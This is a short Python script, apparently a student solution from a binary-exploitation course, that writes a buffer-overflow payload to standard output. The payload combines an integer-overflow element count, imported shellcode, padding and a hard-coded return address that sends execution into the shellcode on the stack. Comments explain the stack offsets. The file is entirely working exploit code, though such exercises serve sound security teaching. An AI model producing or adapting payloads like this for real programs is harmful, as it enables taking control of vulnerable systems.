#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here

# 0x80000006 = maz size of int / 4
# after ret from read_elements, shell code at 0xfffec410 and return value at 0xfffec45c (ebp+4)
# so the difference between the end of the shell code and the start of 45c is 53
sys.stdout.buffer.write(pack('<I', 0x80000006) + shellcode + 53*b'\x11' + pack('<I', 0xfffec410))


